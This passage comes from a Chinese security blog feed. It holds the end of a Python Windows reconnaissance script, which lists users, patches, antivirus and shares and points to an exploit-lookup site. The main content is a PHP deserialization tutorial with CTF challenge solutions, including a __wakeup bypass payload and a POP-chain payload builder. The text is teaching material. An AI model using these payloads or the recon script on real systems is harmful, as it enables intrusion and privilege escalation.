class="string">&quot;[*]当前用户名:&quot;</span>.ljust(<span class="number">15</span>), self.currentUser)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]当前用户属组:&quot;</span>.ljust(<span class="number">15</span>), self.currentUserGroup)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]所有用户名:&quot;</span>.ljust(<span class="number">15</span>), self.allUser)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]在线用户:&quot;</span>.ljust(<span class="number">15</span>),  self.OnlineUser)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]补丁安装情况:&quot;</span>.ljust(<span class="number">15</span>), self.patches)</span><br><span class="line">        print(<span class="string">&quot;[-]\n[-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;复制补丁信息到网站查询可用exp：http://bugs.hacking8.com/tiquan/&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]杀软程序:&quot;</span>.ljust(<span class="number">15</span>), self.AVName)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]共享资源:&quot;</span>.ljust(<span class="number">15</span>), self.shareList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">info = getInformation()</span><br><span class="line">info.runCommand()</span><br><span class="line">info.printInfo()</span><br></pre></td></tr></table></figure><p>文件大小6KB，打包后约为6M。脑瓜子又嗡嗡的。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Windows-信息收集&quot;&gt;&lt;a href=&quot;#Windows-信息收集&quot; class=&quot;headerlink&quot; title=&quot;Windows 信息收集&quot;&gt;&lt;/a&gt;Windows 信息收集&lt;/h1&gt;&lt;p&gt;作为一个想偷懒的人，必然就想写个脚本对信息收集，免得自己丢三落四。然而，知道python打包的exe文件大，不知道这么大。于是只有个半成品。&lt;/p&gt;</summary>
    
    
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化总结</title>
    <link href="http://example.com/2020/11/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2020/11/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/</id>
    <published>2020-11-12T00:01:45.000Z</published>
    <updated>2020-11-12T00:04:37.398Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><h3 id="PHP序列化与反序列化意义"><a href="#PHP序列化与反序列化意义" class="headerlink" title="PHP序列化与反序列化意义"></a>PHP序列化与反序列化意义</h3><p>在开发的过程中常常遇到需要把<strong>对象</strong>或者<strong>数组</strong>进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。</p><p><strong>序列化</strong>（串行化）：是将变量转换为可保存或传输的字符串的过程；</p><p><strong>反序列化</strong>（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p><p>常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 </p><a id="more"></a><h3 id="PHP序列化与反序列化入门"><a href="#PHP序列化与反序列化入门" class="headerlink" title="PHP序列化与反序列化入门"></a>PHP序列化与反序列化入门</h3><p>首先定义了一个类，其中包含两个共有变量<code>name</code>和<code>pass</code>。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094910.png" alt="image-20201108162349456"></p><p>序列化成了一长串字符串。其中O代表对象，4代表长度，come表示对象的名字，2表示对象有两个成员。括号里面就是描述这些成员。s表示是字符串，4表示该字符串中有4个字符。先尝试输出<code>$name</code>和<code>pass</code></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094916.png" alt="image-20201108164117690"></p><p>我对php反序列化漏洞的理解就是：新建了一个对象，并修改其中的成员变量，利用对象中的函数执行我们想让其执行的命令。我认为可以将其理解为SQL注入，注入的参数由攻击者任意设计，但是其中的过滤函数我们没办法修改，这里的成员函数就类似于sql注入中的过滤函数，只能使劲的想办法绕过，或者在php反序列化中使劲的利用这些函数进行命令等执行。</p><p>例如想让<code>getInfo</code>输出一些其他的东西。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Rainbow&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Username: &#x27;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot; Password: &quot;</span> . <span class="keyword">$this</span>-&gt;pass;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$come1</span> = <span class="keyword">new</span> come();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$come1</span>-&gt;getInfo().<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;come&#x27;</span>])-&gt;getInfo();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$come1</span>-&gt;getInfo().<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094920.png" alt="image-20201108170225906"></p><p>可以看到，<code>Username</code>和<code>Password</code>的值已经变了，其实就是新建了一个对象，然后调用<code>come</code>对象里面的<code>getInfo</code>函数输出 。</p><p>上面只是一个public的案例，接下来再看看成员变量是private时候的情况。private修饰的成员变量在序列化时会产生一个从%00经过urldecode解码后的符号来显出他的特殊。说起来绕口，直接上图片：</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094926.png" alt="image-20201108185458912"></p><p>显示不出来的，就是%00经过url解码后的符号。相应的protected修饰的成员变量序列化的情况如下：</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094929.png" alt="image-20201108190839867"></p><p>protected使用的前缀为%00*%00 对成员变量进行修饰。</p><h3 id="PHP类的魔术方法"><a href="#PHP类的魔术方法" class="headerlink" title="PHP类的魔术方法"></a>PHP类的魔术方法</h3><p>魔术方法就是在序列化或者反序列化的时候，程序会”情不自禁”的去调用这些函数。常见的有下面5个</p><ul><li>__construct 当一个对象创建时被调用</li><li>__destruct 当一个对象销毁时被调用</li><li>__toString 当一个对象被当作一个字符串使用</li><li>__sleep 在对象被序列化之前运行</li><li>__wakeup 在对象被反序列化之后被调用</li><li>__call():当要调用的方法不存在或权限不足时自动调用</li><li>__invoke():当把一个类当作函数使用时自动调用</li></ul><p>拿网上最好的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;construct run&#x27;</span>;</span><br><span class="line"></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;destruct run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;toString run&#x27;</span>;</span><br><span class="line">                  <span class="keyword">return</span> <span class="string">&#x27;qwe&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;sleep run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;wakeup run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$test</span>= <span class="keyword">new</span> Test(); <span class="comment">// 创建对象的时候运行 construct</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sTest</span>= serialize(<span class="variable">$test</span>); <span class="comment">// 序列化的时候先调用 sleep</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$usTest</span>= unserialize(<span class="variable">$sTest</span>); <span class="comment">// 反序列先调用__wakeup函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$string</span>= <span class="string">&#x27;hello class &#x27;</span> . <span class="variable">$test</span>;  <span class="comment">// 调用toString函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//整个结束调用destruct函数</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="关卡一"><a href="#关卡一" class="headerlink" title="关卡一"></a>关卡一</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$KEY</span> = <span class="string">&quot;D0g3!!!&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (unserialize(<span class="variable">$str</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到如果反序列化<code>$_GET&#123;&#39;str&#39;]</code>之后的内容为<code>D0g3!!!</code>，那么就能成功。那就简单了，逆向考虑，<code>$str=serialize($KEY)</code>即可</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094936.png" alt="image-20201108203657455"></p><h4 id="关卡二"><a href="#关卡二" class="headerlink" title="关卡二"></a>关卡二</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">&quot;\\&quot;</span>)===<span class="literal">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">&#x27;/&#x27;</span>)===<span class="literal">false</span>)</span><br><span class="line">                    show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">                <span class="keyword">else</span>      </span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Wrong filename.&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt; file=<span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">        show_source(<span class="string">&#x27;index.php&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="variable">$file</span>=base64_decode( <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">        <span class="keyword">echo</span> unserialize(<span class="variable">$file</span> ); </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span>   &lt;!--key in flag.php--&gt;</span><br></pre></td></tr></table></figure><p>这里通过<code>$_GET[&#39;file&#39;]</code>获取然后base64解码，然后再执行反序列化。然后看下漏洞怎么利用，反序列化会首先调用<code>wakeup</code>函数，在这里，会直接把文件名直接给替换成<code>index.php</code>，然后才会show源码。既然不能改变<code>$file</code>的值，那么只有绕过这个函数了。</p><p>构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;SoFun&quot;:1:&#123;s:7:&quot;%00*%00file&quot;;s:8:&quot;flag.php&quot;;&#125;    这是正常构造的payload，但是这个payload会经过wakeup函数</span><br><span class="line"></span><br><span class="line">但是要想绕过wakeup，需要修改到下面这种形式</span><br><span class="line"></span><br><span class="line">O:5:&quot;SoFun&quot;:2:&#123;s:7:&quot;%00*%00file&quot;;s:8:&quot;flag.php&quot;;&#125;    这里就能绕过wakeup函数，将成员函数的变量设置成比实际成员变量大，就能绕过</span><br></pre></td></tr></table></figure><p>绕过具体可以参考<a href="https://www.cnblogs.com/zy-king-karl/p/11436872.html">https://www.cnblogs.com/zy-king-karl/p/11436872.html</a></p><h4 id="关卡三"><a href="#关卡三" class="headerlink" title="关卡三"></a>关卡三</h4><p>来源：<a href="https://bbs.ichunqiu.com/thread-45290-1-1.html?from=aqzx4">https://bbs.ichunqiu.com/thread-45290-1-1.html?from=aqzx4</a></p><p>一串连环套的调用案例，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;`字符串拼接`&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那只有倒退了。要想获取flag，就要调用<code>get_flag</code>函数，要想调用<code>get_flag</code>函数，就需要掉i用<code>__toString</code>方法，而这个方法只在被当作字符串输出的时候才会被调用，有输出的就是<code>func</code>类里面的<code>invoke</code>函数，而<code>invoke</code>函数只有把类当作函数使用的时候才会被调用，然后又看到<code>funct</code>对象，而<code>call</code>只有调用方法不存在的情况下被调用，再看到<code>Call</code>，里面调用了一个不知道的函数，然后就追溯到<code>destruct</code>函数。构造payload：</p><p>在每个函数里面添加一个 construct初始化函数，并指向下一个函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;`字符串拼接`&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> start_gg());</span><br><span class="line"><span 